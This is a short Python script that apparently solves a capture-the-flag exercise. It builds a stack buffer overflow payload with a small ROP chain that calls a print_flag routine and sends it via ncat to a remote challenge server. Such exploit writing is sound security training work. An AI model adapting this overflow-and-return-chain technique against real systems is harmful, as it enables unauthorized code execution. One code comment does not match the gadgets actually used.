#!/usr/bin/python

import os
import struct

# These values were found with `objdump -d a.out` or ROPgadget.
pop_ret = 0x8062999
print_flag = 0x80488e0

# buffer overflow.
payload = "A"*0x6c
payload += "BBBB"

# The add_bin(0xdeadbeef) gadget.
payload += struct.pack("I", print_flag)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xd)

# Our final destination.
os.system("perl -e 'print \"%s\"' |  ncat hexhexhivepc1.epfl.ch 10007" % payload)
